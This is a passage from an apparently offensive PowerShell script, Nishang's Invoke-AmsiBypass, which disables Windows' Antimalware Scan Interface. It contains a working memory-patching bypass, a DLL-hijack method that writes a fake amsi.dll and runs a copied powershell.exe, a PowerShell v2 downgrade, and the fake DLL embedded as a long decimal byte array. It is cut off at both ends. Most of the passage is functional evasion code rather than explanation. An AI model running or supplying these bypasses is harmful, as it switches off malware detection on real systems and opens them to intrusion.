bypass.\"\n[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141)\n}\n}\n\"dllhijack\"\n{\nWrite-Verbose \"Using Cornelis de Plaa's DLL hijack method.\"\nif ($ShowOnly -eq $True)\n{\nWrite-Output \"Copy powershell.exe from C:\\Windows\\System32\\WindowsPowershell\\v1.0 to a local folder and dropa fake amsi.dll in the same directory.\"\nWrite-Output \"Run the new powershell.exe and AMSI should be gone for that session.\"\n}\nelse\n{\n[Byte[]] $temp = $DllBytes -split ' '                \nWrite-Output \"Executing the bypass.\"\nWrite-Verbose \"Dropping the fake amsi.dll to disk.\"\n[System.IO.File]::WriteAllBytes(\"$pwd\\amsi.dll\", $temp)\nWrite-Verbose \"Copying powershell.exe to the current working directory.\"\nCopy-Item -Path C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Destination $pwd\nWrite-Verbose \"Starting powershell.exe from the current working directory.\"\n&amp; \"$pwd\\powershell.exe\"\n}\n}\n\"psv2\"\n{\nWrite-Verbose \"Using PowerShell version 2 which doesn't support AMSI.\"\nif ($ShowOnly -eq $True)\n{\nWrite-Output \"If .Net version 2.0.50727 is installed, run powershell -v 2 and run scripts from the new PowerShell process.\"\n}\nelse\n{\nWrite-Verbose \"Checking if .Net version 2.0.50727 is installed.\"\n$versions = Get-ChildItem 'HKLM:\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP' -recurse | Get-ItemProperty -name Version -EA 0 | Where { $_.PSChildName -match '^(?!S)\\p{L}'} | Select -ExpandProperty Version\nif($versions -match \"2.0.50727\")\n{\nWrite-Verbose \".Net version 2.0.50727 found.\"\nWrite-Output \"Executing the bypass.\"\npowershell.exe -version 2\n}\nelse\n{\nWrite-Verbose \".Net version 2.0.50727 not found. Can't start PowerShell v2.\"\n}\n}\n}\n\"obfuscation\"\n{\nWrite-Output \"AMSI and the AVs which support it can be bypassed using obfuscation techqniues.\"\nWrite-Output \"ISE-Steroids (http://www.powertheshell.com/isesteroidsmanual/download/) and Invoke-Obfuscation can be used (https://github.com/danielbohannon/Invoke-Obfuscation).\"\n}\n}\n}\nfunction Invoke-AmsiBypass\n{\n&lt;#\n.SYNOPSIS\nNishang script which uses publicly known methods to bypass/avoid AMSI.\n.DESCRIPTION\nThis script implements publicly known methods bypass or avoid AMSI on Windows machines.\nAMSI is a script malware detection mechanism enabled by default in Windows 10. \n(https://msdn.microsoft.com/en-us/library/windows/desktop/dn889587(v=vs.85).aspx)\nThis script implements 6 methods of bypassing AMSI.\nunload - Method by Matt Graeber. Unloads AMSI from current PowerShell session.\nunload2 - Another method by Matt Graeber. Unloads AMSI from current PowerShell session.\nunloadsilent - Another method by Matt Graeber. Unloads AMSI and avoids WMF5 autologging.\nunloadobfuscated - 'unload' method above obfuscated with Daneil Bohannon's Invoke-Obfuscation - which avoids WMF5 autologging. \ndllhijack - Method by Cornelis de Plaa. The amsi.dll used in the code is from p0wnedshell (https://github.com/Cn33liz/p0wnedShell) \npsv2 - If .net 2.0.50727 is available on Windows 10. PowerShell v2 is launched which doesn't support AMSI.\nThe script also provides information on tools which can be used for obfuscation:\nISE-Steroids (http://www.powertheshell.com/isesteroidsmanual/download/)\nInvoke-Obfuscation (https://github.com/danielbohannon/Invoke-Obfuscation)\n.PARAMETER Method\nThe method to be used for elevation. Defaut one is unloadsilent.\n.PARAMETER ShowOnly\nThe bypass is not executed. Just shown to the user. \n.EXAMPLE\nPS &gt; Invoke-AmsiBypass -Verbose\nAbove command runs the unloadsilent method.\n.EXAMPLE\nPS &gt; Invoke-PsUACme -Method unloadobfuscated -Verbose\nAbove command runs the unloadobfuscated method.\n.LINK\nhttp://www.labofapenetrationtester.com/2016/09/amsi.html\nhttps://github.com/samratashok/nishang\n#&gt;\n[CmdletBinding()] Param(\n[Parameter(Position = 0, Mandatory = $False)]\n[ValidateSet(\"unload\",\"unloadsilent\",\"unloadobfuscated\",\"unload2\",\"dllhijack\",\"psv2\",\"obfuscation\")]\n[String]\n$Method = \"unloadsilent\",\n[Parameter(Position = 1, Mandatory = $False)]\n[Switch]\n$ShowOnly\n)\n$AmsiX86 = \"77 90 144 0 3 0 0 0 4 0 0 0 255 255 0 0 184 0 0 0 0 0 0 0 64 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 248 0 0 0 14 31 186 14 0 180 9 205 33 184 1 76 205 33 84 104 105 115 32 112 114 111 103 114 97 109 32 99 97 110 110 111 116 32 98 101 32 114 117 110 32 105 110 32 68 79 83 32 109 111 100 101 46 13 13 10 36 0 0 0 0 0 0 0 190 171 71 149 250 202 41 198 250 202 41 198 250 202 41 198 243 178 186 198 248 202 41 198 148 145 40 199 249 202 41 198 148 145 42 199 251 202 41 198 148 145 44 199 242 202 41 198 148 145 45 199 241 202 41 198 39 53 226 198 248 202 41 198 250 202 40 198 231 202 41 198 40 145 33 199 251 202 41 198 40 145 214 198 251 202 41 198 40 145 43 199 251 202 41 198 82 105 99 104 250 202 41 198 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 80 69 0 0 76 1 6 0 144 29 62 87 0 0 0 0 0 0 0 0 224 0 2 33 11 1 14 0 0 14 0 0 0 18 0 0 0 0 0 0 43 19 0 0 0 16 0 0 0 32 0 0 0 0 0 16 0 16 0 0 0 2 0 0 6 0 0 0 0 0 0 0 6 0 0 0 0 0 0 0 0 112 0 0 0 4 0 0 0 0 0 0 2 0 64 1 0 0 16 0 0 16 0 0 0 0 16 0 0 16 0 0 0 0 0 0 16 0 0 0 0 0 0 0 0 0 0 0 148 36 0 0 80 0 0 0 0 80 0 0 224 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 96 0 0 44 1 0 0 176 32 0 0 112 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 33 0 0 64 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 112 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 46 116 101 120 116 0 0 0 124 12 0 0 0 16 0 0 0 14 0 0 0 4 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 96 46 114 100 97 116 97 0 0 220 7 0 0 0 32 0 0 0 8 0 0 0 18 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 100 97 116 97 0 0 0 136 3 0 0 0 48 0 0 0 2 0 0 0 26 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 192 46 103 102 105 100 115 0 0 20 0 0 0 0 64 0 0 0 2 0 0 0 28 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 114 115 114 99 0 0 0 224 1 0 0 0 80 0 0 0 2 0 0 0 30 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 114 101 108 111 99 0 0 44 1 0 0 0 96 0 0 0 2 0 0 0 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 66 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 51 192 194 12 0 59 13 4 48 0 16 242 117 2 242 195 242 233 96 3 0 0 85 139 236 139 69 12 131 232 0 116 51 131 232 1 116 32 131 232 1 116 17 131 232 1 116 5 51 192 64 235 48 232 245 4 0 0 235 5 232 207 4 0 0 15 182 192 235 31 255 117 16 255 117 8 232 24 0 0 0 89 235 16 131 125 16 0 15 149 192 15 182 192 80 232 23 1 0 0 89 93 194 12 0 106 16 104 24 36 0 16 232 123 9 0 0 106 0 232 35 5 0 0 89 132 192 117 7 51 192 233 224 0 0 0 232 40 4 0 0 136 69 227 179 1 136 93 231 131 101 252 0 131 61 60 51 0 16 0 116 7 106 7 232 203 7 0 0 199 5 60 51 0 16 1 0 0 0 232 74 4 0 0 132 192 116 101 232 206 8 0 0 104 186 25 0 16 232 177 6 0 0 232 93 7 0 0 199 4 36 57 24 0 16 232 160 6 0 0 232 112 7 0 0 199 4 36 128 32 0 16 104 124 32 0 16 232 78 11 0 0 89 89 133 192 117 41 232 237 3 0 0 132 192 116 32 104 120 32 0 16 104 116 32 0 16 232 42 11 0 0 89 89 199 5 60 51 0 16 2 0 0 0 50 219 136 93 231 199 69 252 254 255 255 255 232 68 0 0 0 132 219 15 133 76 255 255 255 232 52 7 0 0 139 240 131 62 0 116 30 86 232 40 5 0 0 89 132 192 116 19 255 117 12 106 2 255 117 8 139 54 139 206 232 136 8 0 0 255 214 255 5 24 48 0 16 51 192 64 232 201 8 0 0 195 138 93 231 255 117 227 232 131 5 0 0 89 195 106 12 104 56 36 0 16 232 105 8 0 0 161 24 48 0 16 133 192 127 4 51 192 235 79 72 163 24 48 0 16 232 22 3 0 0 136 69 228 131 101 252 0 131 61 60 51 0 16 2 116 7 106 7 232 190 6 0 0 232 180 3 0 0 131 37 60 51 0 16 0 199 69 252 254 255 255 255 232 27 0 0 0 106 0 255 117 8 232 65 5 0 0 89 89 51 201 132 192 15 149 193 139 193 232 78 8 0 0 195 232 164 3 0 0 255 117 228 232 6 5 0 0 89 195 106 12 104 88 36 0 16 232 236 7 0 0 131 101 252 0 139 125 12 131 255 1 116 10 131 255 2 116 5 139 93 8 235 49 255 117 16 87 139 93 8 83 232 218 0 0 0 139 240 137 117 228 133 246 15 132 190 0 0 0 255 117 16 87 83 232 216 253 255 255 139 240 137 117 228 133 246 15 132 167 0 0 0 131 255 1 117 7 83 232 198 9 0 0 89 255 117 16 87 83 232 159 253 255 255 139 240 137 117 228 131 255 1 117 43 133 246 117 30 255 117 16 80 83 232 135 253 255 255 255 117 16 86 83 232 147 253 255 255 255 117 16 86 83 232 116 0 0 0 131 255 1 117 4 133 246 116 4 133 255 117 11 83 232 130 9 0 0 89 133 255 116 5 131 255 3 117 72 255 117 16 87 83 232 98 253 255 255 139 240 137 117 228 133 246 116 53 255 117 16 87 83 232 58 0 0 0 139 240 235 36 139 77 236 139 1 81 255 48 104 22 16 0 16 255 117 16 255 117 12 255 117 8 232 86 2 0 0 131 196 24 195 139 101 232 51 246 137 117 228 199 69 252 254 255 255 255 139 198 232 54 7 0 0 195 85 139 236 86 139 53 160 32 0 16 133 246 117 5 51 192 64 235 18 255 117 16 139 206 255 117 12 255 117 8 232 193 6 0 0 255 214 94 93 194 12 0 85 139 236 131 125 12 1 117 5 232 88 4 0 0 255 117 16 255 117 12 255 117 8 232 177 254 255 255 131 196 12 93 194 12 0 85 139 236 106 0 255 21 40 32 0 16 255 117 8 255 21 0 32 0 16 104 9 4 0 192 255 21 4 32 0 16 80 255 21 8 32 0 16 93 195 85 139 236 129 236 36 3 0 0 106 23 232 234 8 0 0 133 192 116 5 106 2 89 205 41 163 32 49 0 16 137 13 28 49 0 16 137 21 24 49 0 16 137 29 20 49 0 16 137 53 16 49 0 16 137 61 12 49 0 16 102 140 21 56 49 0 16 102 140 13 44 49 0 16 102 140 29 8 49 0 16 102 140 5 4 49 0 16 102 140 37 0 49 0 16 102 140 45 252 48 0 16 156 143 5 48 49 0 16 139 69 0 163 36 49 0 16 139 69 4 163 40 49 0 16 141 69 8 163 52 49 0 16 139 133 220 252 255 255 199 5 112 48 0 16 1 0 1 0 161 40 49 0 16 163 44 48 0 16 199 5 32 48 0 16 9 4 0 192 199 5 36 48 0 16 1 0 0 0 199 5 48 48 0 16 1 0 0 0 106 4 88 107 192 0 199 128 52 48 0 16 2 0 0 0 106 4 88 107 192 0 139 13 4 48 0 16 137 76 5 248 106 4 88 193 224 0 139 13 0 48 0 16 137 76 5 248 104 164 32 0 16 232 225 254 255 255 139 229 93 195 85 139 236 139 69 8 86 139 72 60 3 200 15 183 65 20 141 81 24 3 208 15 183 65 6 107 240 40 3 242 59 214 116 25 139 77 12 59 74 12 114 10 139 66 8 3 66 12 59 200 114 12 131 194 40 59 214 117 234 51 192 94 93 195 139 194 235 249 232 85 7 0 0 133 192 117 3 50 192 195 100 161 24 0 0 0 86 190 64 51 0 16 139 80 4 235 4 59 208 116 16 51 192 139 202 240 15 177 14 133 192 117 240 50 192 94 195 176 1 94 195 232 32 7 0 0 133 192 116 7 232 118 5 0 0 235 5 232 77 7 0 0 176 1 195 106 0 232 207 0 0 0 132 192 89 15 149 192 195 232 97 7 0 0 132 192 117 3 50 192 195 232 85 7 0 0 132 192 117 7 232 76 7 0 0 235 237 176 1 195 232 66 7 0 0 232 61 7 0 0 176 1 195 85 139 236 232 203 6 0 0 133 192 117 24 131 125 12 1 117 18 255 117 16 139 77 20 80 255 117 8 232 136 4 0 0 255 85 20 255 117 28 255 117 24 232 219 6 0 0 89 89 93 195 232 155 6 0 0 133 192 116 12 104 68 51 0 16 232 220 6 0 0 89 195 232 240 6 0 0 133 192 15 132 217 6 0 0 195 106 0 232 221 6 0 0 89 233 215 6 0 0 85 139 236 131 125 8 0 117 7 198 5 92 51 0 16 1 232 186 4 0 0 232 189 6 0 0 132 192 117 4 50 192 93 195 232 176 6 0 0 132 192 117 10 106 0 232 165 6 0 0 89 235 233 176 1 93 195 85 139 236 131 236 12 86 139 117 8 133 246 116 5 131 254 1 117 124 232 31 6 0 0 133 192 116 42 133 246 117 38 104 68 51 0 16 232 80 6 0 0 89 133 192 116 4 50 192 235 87 104 80 51 0 16 232 61 6 0 0 247 216 89 26 192 254 192 235 68 161 4 48 0 16 141 117 244 87 131 224 31 191 68 51 0 16 106 32 89 43 200 131 200 255 211 200 51 5 4 48 0 16 137 69 244 137 69 248 137 69 252 165 165 165 191 80 51 0 16 137 69 244 137 69 248 141 117 244 137 69 252 176 1 165 165 165 95 94 139 229 93 195 106 5 232 6 2 0 0 204 106 8 104 120 36 0 16 232 117 3 0 0 131 101 252 0 184 77 90 0 0 102 57 5 0 0 0 16 117 96 161 60 0 0 16 129 184 0 0 0 16 80 69 0 0 117 79 185 11 1 0 0 102 57 136 24 0 0 16 117 65 139 69 8 185 0 0 0 16 43 193 80 81 232 180 253 255 255 89 89 133 192 116 42 247 64 36 0 0 0 128 117 33 199 69 252 254 255 255 255 176 1 235 31 139 69 236 139 0 51 201 129 56 5 0 0 192 15 148 193 139 193 195 139 101 232 199 69 252 254 255 255 255 50 192 232 59 3 0 0 195 85 139 236 232 11 5 0 0 133 192 116 15 128 125 8 0 117 9 51 192 185 64 51 0 16 135 1 93 195 85 139 236 128 61 92 51 0 16 0 116 6 128 125 12 0 117 18 255 117 8 232 67 5 0 0 255 117 8 232 59 5 0 0 89 89 176 1 93 195 85 139 236 161 4 48 0 16 139 200 51 5 68 51 0 16 131 225 31 255 117 8 211 200 131 248 255 117 7 232 1 5 0 0 235 11 104 68 51 0 16 232 233 4 0 0 89 247 216 89 27 192 247 208 35 69 8 93 195 85 139 236 255 117 8 232 186 255 255 255 247 216 89 27 192 247 216 72 93 195 85 139 236 131 236 20 131 101 244 0 131 101 248 0 161 4 48 0 16 86 87 191 78 230 64 187 190 0 0 255 255 59 199 116 13 133 198 116 9 247 208 163 0 48 0 16 235 102 141 69 244 80 255 21 28 32 0 16 139 69 248 51 69 244 137 69 252 255 21 32 32 0 16 49 69 252 255 21 36 32 0 16 49 69 252 141 69 236 80 255 21 16 32 0 16 139 77 240 141 69 252 51 77 236 51 77 252 51 200 59 207 117 7 185 79 230 64 187 235 16 133 206 117 12 139 193 13 17 71 0 0 193 224 16 11 200 137 13 4 48 0 16 247 209 137 13 0 48 0 16 95 94 139 229 93 195 104 96 51 0 16 255 21 24 32 0 16 195 104 96 51 0 16 232 229 3 0 0 89 195 184 104 51 0 16 195 184 112 51 0 16 195 232 239 255 255 255 139 72 4 131 8 4 137 72 4 232 231 255 255 255 139 72 4 131 8 2 137 72 4 195 184 132 51 0 16 195 85 139 236 129 236 36 3 0 0 83 86 106 23 232 234 3 0 0 133 192 116 5 139 77 8 205 41 51 246 141 133 220 252 255 255 104 204 2 0 0 86 80 137 53 120 51 0 16 232 133 3 0 0 131 196 12 137 133 140 253 255 255 137 141 136 253 255 255 137 149 132 253 255 255 137 157 128 253 255 255 137 181 124 253 255 255 137 189 120 253 255 255 102 140 149 164 253 255 255 102 140 141 152 253 255 255 102 140 157 116 253 255 255 102 140 133 112 253 255 255 102 140 165 108 253 255 255 102 140 173 104 253 255 255 156 143 133 156 253 255 255 139 69 4 137 133 148 253 255 255 141 69 4 137 133 160 253 255 255 199 133 220 252 255 255 1 0 1 0 139 64 252 106 80 137 133 144 253 255 255 141 69 168 86 80 232 252 2 0 0 139 69 4 131 196 12 199 69 168 21 0 0 64 199 69 172 1 0 0 0 137 69 180 255 21 20 32 0 16 86 141 88 255 247 219 141 69 168 137 69 248 141 133 220 252 255 255 26 219 137 69 252 254 195 255 21 40 32 0 16 141 69 248 80 255 21 0 32 0 16 133 192 117 13 15 182 195 247 216 27 192 33 5 120 51 0 16 94 91 139 229 93 195 83 86 190 8 36 0 16 187 8 36 0 16 59 243 115 24 87 139 62 133 255 116 9 139 207 232 56 0 0 0 255 215 131 198 4 59 243 114 234 95 94 91 195 83 86 190 16 36 0 16 187 16 36 0 16 59 243 115 24 87 139 62 133 255 116 9 139 207 232 13 0 0 0 255 215 131 198 4 59 243 114 234 95 94 91 195 255 37 112 32 0 16 204 204 204 204 204 104 75 26 0 16 100 255 53 0 0 0 0 139 68 36 16 137 108 36 16 141 108 36 16 43 224 83 86 87 161 4 48 0 16 49 69 252 51 197 80 137 101 232 255 117 248 139 69 252 199 69 252 254 255 255 255 137 69 248 141 69 240 100 163 0 0 0 0 242 195 139 77 240 100 137 13 0 0 0 0 89 95 95 94 91 139 229 93 81 242 195 85 139 236 255 117 20 255 117 16 255 117 12 255 117 8 104 5 16 0 16 104 4 48 0 16 232 203 1 0 0 131 196 24 93 195 85 139 236 131 37 124 51 0 16 0 131 236 44 83 51 219 67 9 29 16 48 0 16 106 10 232 228 1 0 0 133 192 15 132 116 1 0 0 131 101 236 0 51 192 131 13 16 48 0 16 2 51 201 86 87 137 29 124 51 0 16 141 125 212 83 15 162 139 243 91 137 7 137 119 4 137 79 8 137 87 12 139 69 212 139 77 224 137 69 244 129 241 105 110 101 73 139 69 220 53 110 116 101 108 11 200 139 69 216 53 71 101 110 117 11 200 247 217 106 1 88 26 201 106 0 128 193 1 89 83 15 162 139 243 91 137 7 137 119 4 137 79 8 137 87 12 116 67 139 69 212 37 240 63 255 15 61 192 6 1 0 116 35 61 96 6 2 0 116 28 61 112 6 2 0 116 21 61 80 6 3 0 116 14 61 96 6 3 0 116 7 61 112 6 3 0 117 17 139 61 128 51 0 16 131 207 1 137 61 128 51 0 16 235 6 139 61 128 51 0 16 131 125 244 7 139 69 224 137 69 228 139 69 220 137 69 248 137 69 232 124 50 106 7 88 51 201 83 15 162 139 243 91 141 93 212 137 3 137 115 4 137 75 8 137 83 12 139 69 216 169 0 2 0 0 137 69 236 139 69 248 116 9 131 207 2 137 61 128 51 0 16 95 94 169 0 0 16 0 116 109 131 13 16 48 0 16 4 199 5 124 51 0 16 2 0 0 0 169 0 0 0 8 116 85 169 0 0 0 16 116 78 51 201 15 1 208 137 69 240 137 85 244 139 69 240 139 77 244 131 224 6 51 201 131 248 6 117 51 133 201 117 47 161 16 48 0 16 131 200 8 199 5 124 51 0 16 3 0 0 0 246 69 236 32 163 16 48 0 16 116 18 131 200 32 199 5 124 51 0 16 5 0 0 0 163 16 48 0 16 51 192 91 139 229 93 195 51 192 57 5 20 48 0 16 15 149 192 195 195 255 37 52 32 0 16 255 37 60 32 0 16 255 37 56 32 0 16 255 37 48 32 0 16 255 37 64 32 0 16 255 37 104 32 0 16 255 37 100 32 0 16 255 37 96 32 0 16 255 37 92 32 0 16 255 37 88 32 0 16 255 37 84 32 0 16 255 37 80 32 0 16 255 37 76 32 0 16 255 37 72 32 0 16 255 37 12 32 0 16 176 1 195 51 192 195 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 198 38 0 0 0 39 0 0 20 39 0 0 40 39 0 0 68 39 0 0 186 39 0 0 164 39 0 0 138 39 0 0 116 39 0 0 94 39 0 0 226 38 0 0 0 0 0 0 184 37 0 0 84 37 0 0 152 37 0 0 118 37 0 0 194 37 0 0 0 0 0 0 154 38 0 0 140 38 0 0 116 38 0 0 88 38 0 0 60 38 0 0 26 38 0 0 8 38 0 0 250 37 0 0 238 37 0 0 0 0 0 0 27 28 0 16 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 48 0 16 112 48 0 16 0 0 0 0 0 0 0 0 144 29 62 87 0 0 0 0 2 0 0 0 61 0 0 0 132 33 0 0 132 19 0 0 0 0 0 0 144 29 62 87 0 0 0 0 12 0 0 0 20 0 0 0 196 33 0 0 196 19 0 0 0 0 0 0 144 29 62 87 0 0 0 0 13 0 0 0 44 2 0 0 216 33 0 0 216 19 0 0 0 0 0 0 144 29 62 87 0 0 0 0 14 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 92 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 4 48 0 16 128 33 0 16 1 0 0 0 112 32 0 16 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0 0 0 75 26 0 0 82 83 68 83 69 10 117 219 0 114 41 77 133 149 98 78 29 103 122 248 7 0 0 0 67 58 92 68 101 118 101 108 111 112 109 101 110 116 92 65 109 115 105 92 82 101 108 101 97 115 101 92 65 109 115 105 46 112 100 98 0 0 0 0 0 0 0 0 20 0 0 0 20 0 0 0 1 0 0 0 19 0 0 0 71 67 84 76 0 16 0 0 124 12 0 0 46 116 101 120 116 36 109 110 0 0 0 0 0 32 0 0 112 0 0 0 46 105 100 97 116 97 36 53 0 0 0 0 112 32 0 0 4 0 0 0 46 48 48 99 102 103 0 0 116 32 0 0 4 0 0 0 46 67 82 84 36 88 67 65 0 0 0 0 120 32 0 0 4 0 0 0 46 67 82 84 36 88 67 90 0 0 0 0 124 32 0 0 4 0 0 0 46 67 82 84 36 88 73 65 0 0 0 0 128 32 0 0 4 0 0 0 46 67 82 84 36 88 73 90 0 0 0 0 132 32 0 0 4 0 0 0 46 67 82 84 36 88 80 65 0 0 0 0 136 32 0 0 4 0 0 0 46 67 82 84 36 88 80 90 0 0 0 0 140 32 0 0 4 0 0 0 46 67 82 84 36 88 84 65 0 0 0 0 144 32 0 0 4 0 0 0 46 67 82 84 36 88 84 90 0 0 0 0 160 32 0 0 220 0 0 0 46 114 100 97 116 97 0 0 128 33 0 0 4 0 0 0 46 114 100 97 116 97 36 115 120 100 97 116 97 0 0 0 132 33 0 0 128 2 0 0 46 114 100 97 116 97 36 122 122 122 100 98 103 0 0 0 4 36 0 0 4 0 0 0 46 114 116 99 36 73 65 65 0 0 0 0 8 36 0 0 4 0 0 0 46 114 116 99 36 73 90 90 0 0 0 0 12 36 0 0 4 0 0 0 46 114 116 99 36 84 65 65 0 0 0 0 16 36 0 0 4 0 0 0 46 114 116 99 36 84 90 90 0 0 0 0 24 36 0 0 124 0 0 0 46 120 100 97 116 97 36 120 0 0 0 0 148 36 0 0 60 0 0 0 46 105 100 97 116 97 36 50 0 0 0 0 208 36 0 0 20 0 0 0 46 105 100 97 116 97 36 51 0 0 0 0 228 36 0 0 112 0 0 0 46 105 100 97 116 97 36 52 0 0 0 0 84 37 0 0 136 2 0 0 46 105 100 97 116 97 36 54 0 0 0 0 0 48 0 0 24 0 0 0 46 100 97 116 97 0 0 0 24 48 0 0 112 3 0 0 46 98 115 115 0 0 0 0 0 64 0 0 20 0 0 0 46 103 102 105 100 115 36 121 0 0 0 0 0 80 0 0 88 0 0 0 46 114 115 114 99 36 48 49 0 0 0 0 96 80 0 0 128 1 0 0 46 114 115 114 99 36 48 50 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 254 255 255 255 0 0 0 0 208 255 255 255 0 0 0 0 254 255 255 255 0 0 0 0 110 17 0 16 0 0 0 0 254 255 255 255 0 0 0 0 212 255 255 255 0 0 0 0 254 255 255 255 0 0 0 0 233 17 0 16 0 0 0 0 254 255 255 255 0 0 0 0 212 255 255 255 0 0 0 0 254 255 255 255 203 18 0 16 234 18 0 16 0 0 0 0 254 255 255 255 0 0 0 0 216 255 255 255 0 0 0 0 254 255 255 255 215 22 0 16 234 22 0 16 20 37 0 0 0 0 0 0 0 0 0 0 220 37 0 0 48 32 0 0 44 37 0 0 0 0 0 0 0 0 0 0 164 38 0 0 72 32 0 0 228 36 0 0 0 0 0 0 0 0 0 0 206 39 0 0 0 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 198 38 0 0 0 39 0 0 20 39 0 0 40 39 0 0 68 39 0 0 186 39 0 0 164 39 0 0 138 39 0 0 116 39 0 0 94 39 0 0 226 38 0 0 0 0 0 0 184 37 0 0 84 37 0 0 152 37 0 0 118 37 0 0 194 37 0 0 0 0 0 0 154 38 0 0 140 38 0 0 116 38 0 0 88 38 0 0 60 38 0 0 26 38 0 0 8 38 0 0 250 37 0 0 238 37 0 0 0 0 0 0 40 0 95 95 116 101 108 101 109 101 116 114 121 95 109 97 105 110 95 105 110 118 111 107 101 95 116 114 105 103 103 101 114 0 41 0 95 95 116 101 108 101 109 101 116 114 121 95 109 97 105 110 95 114 101 116 117 114 110 95 116 114 105 103 103 101 114 0 37 0 95 95 115 116 100 95 116 121 112 101 95 105 110 102 111 95 100 101 115 116 114 111 121 95 108 105 115 116 0 0 72 0 109 101 109 115 101 116 0 0 53 0 95 101 120 99 101 112 116 95 104 97 110 100 108 101 114 52 95 99 111 109 109 111 110 0 86 67 82 85 78 84 73 77 69 49 52 48 46 100 108 108 0 0 56 0 95 105 110 105 116 116 101 114 109 0 57 0 95 105 110 105 116 116 101 114 109 95 101 0 65 0 95 115 101 104 95 102 105 108 116 101 114 95 100 108 108 0 53 0 95 105 110 105 116 105 97 108 105 122 101 95 110 97 114 114 111 119 95 101 110 118 105 114 111 110 109 101 110 116 0 0 54 0 95 105 110 105 116 105 97 108 105 122 101 95 111 110 101 120 105 116 95 116 97 98 108 101 0 0 62 0 95 114 101 103 105 115 116 101 114 95 111 110 101 120 105 116 95 102 117 110 99 116 105 111 110 0 36 0 95 101 120 101 99 117 116 101 95 111 110 101 120 105 116 95 116 97 98 108 101 0 31 0 95 99 114 116 95 97 116 101 120 105 116 0 23 0 95 99 101 120 105 116 0 0 97 112 105 45 109 115 45 119 105 110 45 99 114 116 45 114 117 110 116 105 109 101 45 108 49 45 49 45 48 46 100 108 108 0 130 5 85 110 104 97 110 100 108 101 100 69 120 99 101 112 116 105 111 110 70 105 108 116 101 114 0 0 67 5 83 101 116 85 110 104 97 110 100 108 101 100 69 120 99 101 112 116 105 111 110 70 105 108 116 101 114 0 9 2 71 101 116 67 117 114 114 101 110 116 80 114 111 99 101 115 115 0 97 5 84 